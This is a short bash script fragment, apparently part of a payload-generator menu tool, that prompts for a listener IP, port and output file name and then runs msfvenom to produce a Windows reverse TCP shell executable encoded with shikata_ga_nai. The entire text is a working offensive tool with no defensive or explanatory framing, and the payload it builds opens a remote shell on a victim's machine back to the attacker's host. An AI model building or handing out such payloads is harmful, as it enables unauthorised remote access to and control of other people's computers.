	echo "Platform : Windows/Reverse TCP Shell"
	echo ""
	echo -n "Enter Listener IP: "
	read IP

	echo Using IP : $IP

        echo -n "Enter Listener Port: "
        read PORT

	echo Using Port : $PORT

	echo -n "Where Should I Say The Output?: "
	read OUTPUT

	echo Saving TO $OUTPUT

	msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$IP LPORT=$PORT -b "\x00" -e x86/shikata_ga_nai -f exe -o $OUTPUT
